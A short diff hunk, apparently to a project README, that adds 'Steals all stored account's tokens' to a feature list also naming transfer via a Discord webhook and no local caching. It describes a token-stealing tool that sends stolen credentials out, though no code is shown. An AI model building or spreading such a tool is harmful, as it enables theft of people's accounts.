@@ -6,6 +6,7 @@
 # Features
  - No local caching
  - Transferring via Discord webhook
+ - Steals all stored account's tokens
  - \[**todo**\] No external Python modules needed
 
 <br>
